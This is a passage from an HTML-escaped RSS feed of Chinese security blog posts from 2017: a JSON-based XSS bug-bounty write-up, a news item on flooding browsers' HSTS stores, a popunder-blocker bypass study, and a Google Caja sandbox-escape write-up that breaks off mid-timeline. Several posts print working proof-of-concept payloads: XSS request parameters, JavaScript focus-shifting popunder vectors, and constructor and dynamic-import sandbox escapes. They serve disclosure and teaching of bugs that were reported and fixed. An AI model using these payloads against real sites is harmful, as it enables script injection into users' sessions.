{&quot;success&quot;:true,&quot;status&quot;:{&quot;&amp;lt;haha&amp;gt;&quot;:&quot;test&quot;}}&lt;/code&gt;&lt;p&gt;所以，尖括号是绕过了，那么“=”呢？ &lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-00f21d1b699422fb655c64227824a286_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1330&quot; data-rawheight=&quot;377&quot;&gt;&lt;code lang=&quot;text&quot;&gt;request:
process=activate_newsletter&amp;amp;status[&amp;lt;haha=&amp;gt;]=test&amp;amp;usid=xxx

response:
{&quot;success&quot;:true,&quot;status&quot;:null}&lt;/code&gt;&lt;p&gt;因为等号会破坏查询语句，所以我们得到了一个空值 null ，接下来我尝试 URL 编码，这就成功绕过了。 &lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-f6055cd26b795b84629a4c2087e65ad5_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1240&quot; data-rawheight=&quot;347&quot;&gt;&lt;code lang=&quot;text&quot;&gt;request:
process=activate_newsletter&amp;amp;status[&amp;lt;haha%3D&amp;gt;]=test&amp;amp;usid=xxx

response:
{&quot;success&quot;:true,&quot;status&quot;:{&quot;&amp;lt;haha=&amp;gt;&quot;:&quot;test&quot;}}&lt;/code&gt;&lt;p&gt;接下来是最后的 payload ： &lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-beb4379b467a8daa4b9552eec1ea8d8f_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1347&quot; data-rawheight=&quot;363&quot;&gt;&lt;code lang=&quot;text&quot;&gt;request:
process=activate_newsletter&amp;amp;status[&amp;lt;haha onmouseover%3Dalert(1)&amp;gt;]=test&amp;amp;usid=xxx

response:
{&quot;success&quot;:true,&quot;status&quot;:{&quot;&amp;lt;haha onmouseover=alert(1)&amp;gt;&quot;:&quot;test&quot;}}&lt;/code&gt;&lt;p&gt;最后需要一个 CSRF 的 POC 来利用它： &lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-ac0b6965c02199540fd16bd2a98e2d1a_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1060&quot; data-rawheight=&quot;449&quot;&gt;&lt;p&gt;但是 userid 参数是很难猜到的，我在其它地方检查了也没发现 userid ，就报告了这个漏洞，他们很快修复了这个漏洞，因为整个网站是采用同样的方法来展示 JSON 数据。最后也得到了丰厚的奖金。;) &lt;/p&gt;&lt;p&gt;感谢阅读。 &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;参考：&lt;a href=&quot;http://c0d3g33k.blogspot.jp/2017/11/story-of-json-xss.html&quot;&gt;http://c0d3g33k.blogspot.jp/2017/11/story-of-json-xss.html&lt;/a&gt; &lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2017-12-22-32253101</guid>
<pubDate>Fri, 22 Dec 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>主流浏览器中 HSTS 的缺陷</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2017-12-19-32153145.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;主流浏览器中 HSTS 的缺陷&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/32153145&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic5.zhimg.com/v2-85eab5d9cb0719e9597fa5bf46296100_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;研究人员发现，使用数据覆盖攻击受害者的浏览器达到绕过 HSTS 保护。 &lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-9341f8a64710cd40aff86c52e9b5c7e8_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;554&quot; data-rawheight=&quot;277&quot;&gt;&lt;p&gt;自从&lt;a href=&quot;https://tools.ietf.org/html/rfc6797&quot;&gt;2012年末&lt;/a&gt;被互联网工程指导组（Internet Engineering Steering Group）批准以来，&lt;a href=&quot;https://www.google.co.jp/url?sa=t&amp;amp;rct=j&amp;amp;q=&amp;amp;esrc=s&amp;amp;source=web&amp;amp;cd=1&amp;amp;cad=rja&amp;amp;uact=8&amp;amp;ved=0ahUKEwiqnK2X5ojYAhWGFpQKHTaZAPAQFggnMAA&amp;amp;url=https%3A%2F%2Fzh.wikipedia.org%2Fzh%2FHTTP%25E4%25B8%25A5%25E6%25A0%25BC%25E4%25BC%25A0%25E8%25BE%2593%25E5%25AE%2589%25E5%2585%25A8&amp;amp;usg=AOvVaw1I0t-UlHpdiarr8AUPaIPA&quot;&gt;HTTP严格传输安全&lt;/a&gt;（HSTS）已经成为一种广泛使用的网络安全策略机制，可帮助保护网站免受协议降级攻击，cookie 劫持以及 SSLstrip 等攻击工具的攻击。 &lt;/p&gt;&lt;p&gt;HSTS 规定 Web 浏览器和服务器应该使用安全的 HTTPS 连接进行通信，不能使用不安全的 HTTP 协议通信，以此来提供更高级别的安全性。 &lt;/p&gt;&lt;p&gt;然而，Telefonica 网络安全部门 &lt;a href=&quot;https://www.elevenpaths.com/&quot;&gt;ElevenPaths&lt;/a&gt; 的研究人员已经证明了 HSTS 保护是可以被绕过的：通过攻击者控制的域名所发布的指令淹没受害者的浏览器。 &lt;/p&gt;&lt;p&gt;ElevenPaths 的研究人员 Sheila Berta 和 Sergio de los Santos 在上周在伦敦举行的 &lt;a href=&quot;https://portswigger.net/daily-swig/black-hat-europe-cyber-is-the-new-black&quot;&gt;Black Hat Europe&lt;/a&gt;上演示了 Firefox 和 Chrome 中的 SSL 证书存储策略如何使攻击者可以绕过 HSTS 保护。 &lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-9437de92427191426b52f6dae4188246_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1556&quot; data-rawheight=&quot;847&quot;&gt;&lt;p&gt;“Firefox 使用一个有1,024个条目的 TXT 文件来记录 HSTS 和 &lt;a href=&quot;https://zh.wikipedia.org/wiki/HTTP%E5%85%AC%E9%92%A5%E5%9B%BA%E5%AE%9A&quot;&gt;HPKP&lt;/a&gt; 域，” de los Santos “ 告诉 &lt;a href=&quot;https://portswigger.net/daily-swig&quot;&gt;The Daily Swig&lt;/a&gt;。“他们似乎认为用户不太可能需要存储比这更多的数据了，但是如果超出这个限制的话，他们会为每个域设置一个 ”score“ 标记。 &lt;/p&gt;&lt;p&gt;“score 表示用户在不同的时间访问某个域的频率 ，score 值为 0 意味着 header 头已经超期了或是第一次访问这个站点。如果您再次访问，则第二天的 score 将变为“1”，依次类推。 &lt;/p&gt;&lt;p&gt;De los Santos 解释了如果 Firefox 需要删除1,024个 SSL 条目中的一个以释放空间，那么值最低的 score 就会被替换。 &lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-ec4ea2b22183a168b611ecf222270cb8_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1557&quot; data-rawheight=&quot;887&quot;&gt;&lt;p&gt;他说：“我们是以两种方式实施攻击：一个 Bettercap JavaScript 注入和一个特殊的网站。“两者都通过不同的子域发送了很多的 HSTS头（我们称之为”垃圾条目“）。” &lt;/p&gt;&lt;p&gt;研究人员发现，通过用新指令淹没受害者的 Firefox 浏览器，合法数据会被删除。de los Santos 说：“从1024个表中去掉一个域名就等同于禁用 HSTS 和 HPKP，使受害者遭受中间人攻击。” &lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-536fdd90af4599c569e4daae4295d53f_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1553&quot; data-rawheight=&quot;846&quot;&gt;&lt;p&gt;在 Chrome 浏览器中的攻击更容易，研究人员说这里并没有 ”score” 的概念。“ chrome将 HSTS 和 HPKP 存储在 JSON 文件中，”de los Santos 说。“如果采用中间人攻击的方式向浏览器发送了很多 HSTS 和 HPKP 条目，它将永远存储所有这些条目。” &lt;/p&gt;&lt;p&gt;用这种洪泛的方式向浏览器发送数以千计的 HSTS 和 HPKP 请求，在大约10分钟内 JSON 文件就占用了500 MB 或更多硬盘空间，导致 Chrome 被冻结。 &lt;/p&gt;&lt;p&gt;de los Santos 说：“唯一可以做的就是尝试删除所有的设置或删除这个 JSON 文件。这个攻击可以在任何可以插入 JavaScript 的网站上完成。 &lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f713b4a91d0b617fea3d65775253e3b2_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1551&quot; data-rawheight=&quot;842&quot;&gt;&lt;p&gt;“IE / Edge 更复杂，”他补充道。“在这个浏览器中，HSTS 似乎不能正常工作。我们找到了存储这些信息的表，但它似乎只能用于主流的域。“ &lt;/p&gt;&lt;p&gt;PPT： &lt;a href=&quot;https://www.blackhat.com/docs/eu-17/materials/eu-17-Berta-Breaking-Out-HSTS-And-HPKP-On-Firefox-IE-Edge-And-Possibly-Chrome.pdf&quot;&gt;https://www.blackhat.com/docs/eu-17/materials/eu-17-Berta-Breaking-Out-HSTS-And-HPKP-On-Firefox-IE-Edge-And-Possibly-Chrome.pdf&lt;/a&gt; &lt;/p&gt;&lt;p&gt;原文：&lt;a href=&quot;https://portswigger.net/daily-swig/researchers-expose-hsts-shortcomings-in-major-browsers&quot;&gt;https://portswigger.net/daily-swig/researchers-expose-hsts-shortcomings-in-major-browsers&lt;/a&gt; &lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2017-12-19-32153145</guid>
<pubDate>Tue, 19 Dec 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>浏览器 UI 安全研究 -Popunder Preventer bypass</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2017-12-15-32043215.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;浏览器 UI 安全研究 -Popunder Preventer bypass&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/32043215&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-9c13579d1978ef1401f51d260accf8fe_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;&lt;b&gt;概述 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;介绍一下最近发现的几个漏洞，它们的挖掘思路和大多数漏洞手法相通，所以就不去刻意介绍过多同类漏洞了，这篇文章主要介绍浏览器的 UI 漏洞。 &lt;/p&gt;&lt;h2&gt;&lt;b&gt;什么是 UI 漏洞 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;先来说说什么是浏览器 UI 。浏览器UI 是指浏览器用户界面。浏览器经过几十年的发展，对于用户界面并没有一个统一的规定标准，目前大多数现代浏览器的用户界面包括：前进和后退按钮、刷新和停止加载按钮、地址栏、状态栏、页面 显示窗口、查看源代码窗口、标签等。另外可能还有一些其他的用户界面，例如下载管理、页面查找、通知、系统选项管理、隐身窗口等等。我们可以把 Browser UI 认为是一个前端标签式的页面管理器或者 Web 的外壳，用户不必去考虑浏览器应用程序底层是如何处理数据的，所有的网络行为结果，均由 Browser UI去展现给用户。 &lt;/p&gt;&lt;p&gt;UI 漏洞就是和 UI 外观操作相关的一些问题。比方说： &lt;/p&gt;&lt;ol&gt;&lt;li&gt;URL Spoof &lt;/li&gt;&lt;li&gt;绕过权限授权窗口（危害性较小） &lt;/li&gt;&lt;li&gt;绕过弹出窗口拦截器 &lt;/li&gt;&lt;li&gt;… &lt;/li&gt;&lt;/ol&gt;&lt;p&gt;浏览器 UI 上最容易发生的攻击其实是用户界面欺骗，也就是 UI Spoof。通常 UI Spoof 被用来进行网络钓鱼攻击使用。详细信息可参考腾讯玄武实验室这篇 &lt;a href=&quot;http://xlab.tencent.com/cn/wp-content/uploads/2017/10/browser-ui-security-whitepaper.pdf&quot;&gt;Browser UI Security 技术白皮书&lt;/a&gt; 。绕过权限授权窗口由于危害较小此处不讨论，今天的主角是怎么样绕过弹出窗口拦截器。 &lt;/p&gt;&lt;h2&gt;&lt;b&gt;Popunder Preventer &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;Popunder Preventer 是用于防止网站通过用户点击弹出背投式广告。这里是 Popunder Preventer 的&lt;a href=&quot;https://cs.chromium.org/chromium/src/chrome/browser/ui/blocked_content/popunder_preventer.cc&quot;&gt;部分实现细节&lt;/a&gt;。 &lt;/p&gt;&lt;p&gt;Popunder Preventer 的作用有如下两个： &lt;/p&gt;&lt;ol&gt;&lt;li&gt;只打开用户指定的窗口 &lt;/li&gt;&lt;li&gt;消灭烦人的广告 &lt;/li&gt;&lt;/ol&gt;&lt;p&gt;一般网页广告分为弹出式广告和背投广告，如图所示，分别为弹出式和Pop背投式： &lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-1377fc1abd54ad3eb78fd46845d2215b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1518&quot; data-rawheight=&quot;563&quot;&gt;&lt;p&gt;现在已经无法通过简单的 JS 来制作背投式广告了，比如： &lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;newWin = window.open(&#39;//example.com/&#39;,&#39;w&#39;,&#39;a&#39;); 
newWin.blur(); 
window.focus();//重新将focus转移到父窗口 &lt;/code&gt;&lt;h2&gt;&lt;b&gt;一段有趣的视频 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这是一段逆向模糊化后的 javascript 绕过 preventer 的&lt;a href=&quot;https://www.youtube.com/watch?v=8UqHCrGdxOM&amp;amp;feature=youtu.be&quot;&gt;视频&lt;/a&gt;&lt;/p&gt;&lt;video id=&quot;None&quot; data-swfurl=&quot;&quot; poster=&quot;https://pic2.zhimg.com/80/v2-ac7a2d0467431e304d30d636c8dfd055_b.jpg&quot; data-sourceurl=&quot;https://www.zhihu.com/video/924980035369197568&quot; data-name=&quot;&quot; data-video-id=&quot;&quot; data-video-playable=&quot;true&quot; data-lens-id=&quot;924980035369197568&quot;&gt;&lt;/video&gt;&lt;p&gt;里面的绕过技巧是首先新建一个窗口，通过从父窗口中发送 alert 转移 focus，alert 消失后，focus 重新转移到父窗口里，新建的窗口移动到后面了（达到了背投广告的效果）。 &lt;/p&gt;&lt;h2&gt;&lt;b&gt;我的思考 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;与其操作 JS，我能不能通过操控 alert 的 focus 来达到攻击效果？ &lt;/p&gt;&lt;p&gt;除了alert，有没有类似的操作能让我们达到效果? &lt;/p&gt;&lt;p&gt;接下来是几个向量： &lt;/p&gt;&lt;ol&gt;&lt;li&gt;Confirm(1) &lt;/li&gt;&lt;li&gt;Prompt(1) &lt;/li&gt;&lt;li&gt;Print() &lt;/li&gt;&lt;li&gt;HTTP基础认证 &lt;/li&gt;&lt;li&gt;打开外部应用协议：location = “mms:”; &lt;/li&gt;&lt;li&gt;onbeforeunload=function(e){return 1;} &lt;/li&gt;&lt;li&gt;支付API &lt;/li&gt;&lt;/ol&gt;&lt;code lang=&quot;js&quot;&gt;new PaymentRequest([{ 
supportedMethods: [&#39;basic-card&#39;] 
}], { 
total: { 
label: 1, 
amount: { 
currency: &#39;USD&#39;, 
value: 0 
} 
} 
}).show(); &lt;/code&gt;&lt;p&gt;8. navigator.usb.requestDevice({filters:[]})&lt;/p&gt;&lt;p&gt;9. &lt;/p&gt;&lt;code lang=&quot;html&quot;&gt;&amp;lt;form&amp;gt; 
&amp;lt;input type=&quot;email&quot; value=&quot;a&quot;&amp;gt; 
&amp;lt;button id=&quot;button&quot;&amp;gt; 
&amp;lt;/form&amp;gt; 
&amp;lt;script&amp;gt; 
button.click(); 
&amp;lt;/script&amp;gt; &lt;/code&gt;&lt;p&gt;一个检查漏洞的方法是：查看是否有办法可以自动转移 focus 并消除对话。 &lt;/p&gt;&lt;p&gt;消除对话的例子： &lt;/p&gt;&lt;ol&gt;&lt;li&gt;从iframe退出对话并移除iframe &lt;/li&gt;&lt;li&gt;重新加载了页面 &lt;/li&gt;&lt;li&gt;用history.back()更改页面 &lt;/li&gt;&lt;li&gt;用CSS隐藏输出对话的元素 &lt;/li&gt;&lt;/ol&gt;&lt;p&gt;比如：利用 Presentation API 的重载消除对话： &lt;/p&gt;&lt;code lang=&quot;html&quot;&gt;&amp;lt;script&amp;gt; 
function popUnder() { 
new PresentationRequest(&quot;&quot;).start(); 
window.open(&quot;https://example.com/&quot;, &quot;_blank&quot;,&quot;a&quot;); 
setTimeout(function(){ 
location.reload();//用reload消除对话 
},1000); 
} 
&amp;lt;/script&amp;gt; 
&amp;lt;button onclick=&quot;popUnder()&quot;&amp;gt;Create PopUnder&amp;lt;/button&amp;gt; &lt;/code&gt;&lt;p&gt;一些例子： &lt;/p&gt;&lt;p&gt;Payment API: &lt;a href=&quot;https://bugs.chromium.org/p/chromium/issues/detail?id=768230&quot;&gt;https://bugs.chromium.org/p/chromium/issues/detail?id=768230&lt;/a&gt; &lt;/p&gt;&lt;p&gt;转移到外部协议&lt;a href=&quot;https://bugs.chromium.org/p/chromium/issues/detail?id=768475&quot;&gt;https://bugs.chromium.org/p/chromium/issues/detail?id=768475&lt;/a&gt; &lt;/p&gt;&lt;p&gt;Presentation API: https://bugs.chromium.org/p/chromium/issues/detail?id=768900 &lt;/p&gt;&lt;p&gt;PDF print():https://bugs.chromium.org/p/chromium/issues/detail?id=769351 &lt;/p&gt;&lt;p&gt;当然，它们都被修复了。 &lt;/p&gt;&lt;p&gt;这些payload都有一些共性： &lt;/p&gt;&lt;ol&gt;&lt;li&gt;强制转移focus &lt;/li&gt;&lt;li&gt;部分必须要用户操作（比如点击）才能继续 &lt;/li&gt;&lt;li&gt;部分会中断页面加载（比如print()） &lt;/li&gt;&lt;li&gt;部分需要手动关闭 &lt;/li&gt;&lt;li&gt;会被弹出拦截器阻挡（比如WebUSB） &lt;/li&gt;&lt;/ol&gt;&lt;p&gt;不过这些payload并不能同时兼容 Mac 和 Windows。无论如何，浏览器依然存在许多类似的问题。 &lt;/p&gt;&lt;h2&gt;&lt;b&gt;UI 漏洞给我们带来的思考 &lt;/b&gt;&lt;/h2&gt;&lt;ol&gt;&lt;li&gt;往往新功能会带来漏洞 &lt;/li&gt;&lt;/ol&gt;&lt;ul&gt;&lt;li&gt;我个人认为地址栏伪造还有很大的攻击空间 &lt;/li&gt;&lt;li&gt;强烈建议新手学习浏览器漏洞挖掘 &lt;/li&gt;&lt;/ul&gt;&lt;p&gt;2.然而浏览器UI漏洞挖掘难以被自动化 &lt;/p&gt;&lt;ul&gt;&lt;li&gt;机器难以从视觉效果来判断UI是否收到了影响 &lt;/li&gt;&lt;/ul&gt;&lt;p&gt;高效挖掘漏洞的方法就是：随手列举不同的弹窗，隔段时间去使用下弹窗，记录下新特性。 &lt;/p&gt;&lt;h2&gt;&lt;b&gt;总结 &lt;/b&gt;&lt;/h2&gt;&lt;ol&gt;&lt;li&gt;我展示了如何绕过弹出阻拦器 &lt;/li&gt;&lt;li&gt;你也能通过转移 focus 来达到相同的效果！ &lt;/li&gt;&lt;li&gt;当你挖掘 UI 漏洞，浏览器弹出对话是一个不错的目标 &lt;/li&gt;&lt;/ol&gt;&lt;p&gt;参考：&lt;a href=&quot;https://speakerdeck.com/masatokinugawa/secusoba-popunder&quot;&gt;https://speakerdeck.com/masatokinugawa/secusoba-popunder&lt;/a&gt; &lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2017-12-15-32043215</guid>
<pubDate>Fri, 15 Dec 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>Yet Another Google Caja bypasses hat-trick</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2017-12-10-31875007.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;Yet Another Google Caja bypasses hat-trick&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/31875007&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-0422e4cd3b240dd97034e5eb93d5876b_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;一年半之前，使用绕过Google Caja 的方法，我在Google Docs 和 Google Developer 发现了三个 XSS 漏洞，我的&lt;a href=&quot;http://blog.bentkowski.info/2016/07/xss-es-in-google-caja.html&quot;&gt;博文&lt;/a&gt;里记录了技术细节。今年我又看了看 Caja ，又发现了三种与之前不同的绕过方法。所以让我们来看看吧。 &lt;/p&gt;&lt;h2&gt;&lt;b&gt;什么是 Caja? &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;根据&lt;a href=&quot;https://developers.google.com/caja/&quot;&gt;官方文档&lt;/a&gt;，“Caja 是一种使第三方 HTML、CSS、Javascript 安全地嵌入到网站中的工具”。这意味着你可以将用户的 Javascript 代码直接运行在网站的上下文中，并且第三方的代码不会获取你的敏感数据，例如原始的 DOM 树等。 &lt;/p&gt;&lt;p&gt;可以在 &lt;a href=&quot;http://caja.appspot.com/&quot;&gt;caja.appspot.com&lt;/a&gt; (Caja Playground) 里面输入一些 HTML 代码来测试 caja 的功能，点击 “Cajole”按钮，你可以看到代码在被重写之后是如何运行的。 &lt;/p&gt;&lt;p&gt;当我们在 Caja Playground 中输入最常见的 XSS 攻击向量（&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;），页面本应该响应一个 alert警告的，然而结果却是这样的： &lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2f25f5f3735c9fce88d3dc2c784bf71d_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;400&quot; data-rawheight=&quot;119&quot;&gt;&lt;p&gt;这里尽管我们使用的是 alert(1)，但实际看到的确是：” Untrusted code says: 1”。这是因为在 Caja Playground 里面，原始的本地 alert 函数已经被重载了，” Untrusted code says:” 被置于警告内容的前面。这对于测试来说是非常有用的，因为如果没有 “Untrusted code says:” 这部分，那么我们确信已经逃脱了 Caja 沙箱并且成功调用了原始函数。 &lt;/p&gt;&lt;h2&gt;&lt;b&gt;JavaScript and eval &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在 Javascript 中，有许多方法将字符串传递给函数来执行代码，最常见的就是 eval 函数。但是对冲破沙箱而言，函数的构造器更加有用。我们可以通过全局对象或任何函数的构造函数获得对构造函数的引用。 &lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-318f27a46540aa8b3d72dcc5444f60a3_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;400&quot; data-rawheight=&quot;155&quot;&gt;&lt;p&gt;构造函数能够冲破沙箱限制是因为它可以让代码运行在全局范围里。  &lt;/p&gt;&lt;p&gt;所以，我们可以使用它来打破 Caja 的限制吗？当然是不行的。当我们试图访问 Caja 中的构造函数时，发现它被 FakeFunction 函数重载了。 &lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-227e1a995048c1724ca27197a8ab6aee_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;113&quot;&gt;&lt;p&gt;在FakeFunction 函数中，Caja 验证函数体并确保沙箱处在正确的位置。 有趣的是，即使Caja根据ECMAScript 5解析JS，生成器函数的构造函数也被重载了。 &lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-aa7c2bc21cdda6c4565bd2de8290b38f_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;136&quot;&gt;&lt;p&gt;我尝试逃脱 FakeFunction  和 FakeGeneratorFunction  的函数验证模式，但都失败了。  &lt;/p&gt;&lt;h2&gt;&lt;b&gt;异步函数 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;一天当我在浏览 MDN 时，我发现异步函数新出一个非常棒的的构造方法： &lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-bd4648cd4adfb7cac172201a6cf4ce37_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;108&quot;&gt;&lt;p&gt;想起 Caja 已经有段时间没发布新东西了，我相信这很有可能会绕过沙盒的限制。我去了 Caja Playground 测试了如下代码： &lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;&amp;lt;script&amp;gt; 
  &amp;lt;!-- 
  (async function(){}).constructor(&#39;alert(1)&#39;)(); 
&amp;lt;/script&amp;gt;  &lt;/code&gt;&lt;p&gt;想知道为什么这里需要一行空注释吗？可以查看我之前的一篇关于&lt;a href=&quot;http://blog.bentkowski.info/2016/07/xss-es-in-google-caja.html&quot;&gt;绕过 Caja &lt;/a&gt;的文章；总之，需要确定 Caja 的 js 解析器没报语法错误。 &lt;/p&gt;&lt;p&gt;点击 “cajoled” ，出现如下结果： &lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-81b016babc78db5a3563d62d1c7fd373_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;198&quot;&gt;&lt;p&gt;“Untrusted code says:” 这句话已经没有了，这意味着我们绕过了沙盒的限制。  &lt;/p&gt;&lt;h2&gt;&lt;b&gt;ECMAScript 的新特性 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;提交漏洞后的几天，我认为应该继续探索 ECMAScript 的特性来绕过 Caja。我查看了著名的 &lt;a href=&quot;https://kangax.github.io/compat-table/esnext/&quot;&gt;Kangax 兼容表&lt;/a&gt; ，看了里面列出的所有特性。印象最深的是&lt;a href=&quot;https://github.com/tc39/proposal-async-iteration&quot;&gt;异步迭代器&lt;/a&gt;，它有一个新的构造函数。 &lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-28cff43fce640e93da431551aef5adaf_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;82&quot;&gt;&lt;p&gt;所以如下代码就可以绕过 Caja: &lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;&amp;lt;script&amp;gt; 
  &amp;lt;!-- 
  (async function*(){})[&#39;constructor&#39;](&#39;alert(1)&#39;)().next(); 
&amp;lt;/script&amp;gt;  &lt;/code&gt;&lt;p&gt;我向谷歌报告了这一发现，本以为谷歌会认为这两次绕过都是相似的。因为漏洞成因是相同的。但令我惊讶的是，谷歌给了我第二次赏金。非常感谢谷歌！ &lt;/p&gt;&lt;h2&gt;&lt;b&gt;再看 ECMAScript &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我找不到其它可以被用来绕过 Caja 的方法了，以为自己的好运都已经用完了，但是我错了！ &lt;/p&gt;&lt;p&gt;我没有意识到 Kangax 表里面并没有包含 ECMAScript 所有的提议。在我脑海中闪过的一个特性是动态&lt;a href=&quot;https://github.com/tc39/proposal-dynamic-import&quot;&gt;导入&lt;/a&gt;。多亏了动态导入，我们可以使用 import() 函数，正如代码中不需要 type=”module” 的函数一样，例如： &lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;&amp;lt;script&amp;gt; 
  // Import script based on username 
  import(`http://example.com/user-scripts/${username)`); 
&amp;lt;/script&amp;gt; &lt;/code&gt;&lt;p&gt;看起来 Caja 似乎并不会怎么过滤动态导入，所以我尝试了如下的代码： &lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;&amp;lt;script&amp;gt; 
  &amp;lt;!-- 
  import(&#39;data:application/javascript,alert(1)&#39;); 
&amp;lt;/script&amp;gt;  &lt;/code&gt;&lt;p&gt;这就导致了 Caja 的第三次绕过 &lt;/p&gt;&lt;p&gt;你可以在这儿看到完整的三次绕过过程： &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://youtu.be/bVs2TSkwmzs&quot;&gt;https://youtu.be/bVs2TSkwmzs&lt;/a&gt; &lt;/p&gt;&lt;h2&gt;&lt;b&gt;总结 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;多亏了 ECMAScript 的新特性，我才能找到绕过 Caja 的三种方法。 &lt;/p&gt;&lt;p&gt;Caja 发布了一个官方的&lt;a href=&quot;https://github.com/google/caja/wiki/SecurityAdvisory20171114&quot;&gt;安全建议&lt;/a&gt;，他们描述了这个修复：“为了防止未来这种形式漏洞的发生，我们让 SES 和 Caja 总是解析和重写输入的 JS ，确保输入的准确性。” &lt;/p&gt;&lt;h2&gt;&lt;b&gt;时间线 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;·  &lt;b&gt;28.08.2017&lt;/b&gt; – 报告异步函数绕过 &lt;/p&gt;&lt;p&gt;·  &lt;b&gt;28.08.2017&lt;/b&gt; – &quot;得到回应&quot;, &lt;/p&gt;&lt;p&gt;·  &lt;b&gt;02.09.2017&lt;/b&gt; – 报告异步迭代器绕过, &lt;/p&gt;&lt;p&gt;·  &lt;b&gt;04.09.2017&lt;/b&gt; – &quot;得到回应&quot;, &lt;/p&gt;&lt;p&gt;·  &lt;b&gt;19.09.2017&lt;/b&gt; – 得到这两个漏洞的奖励 &lt;/p&gt;&lt;p&gt;·  &lt;b&gt;29.09.2017&lt;/b&gt; – 报告动态导入绕过 &lt;/p&gt;&lt;p&gt;·  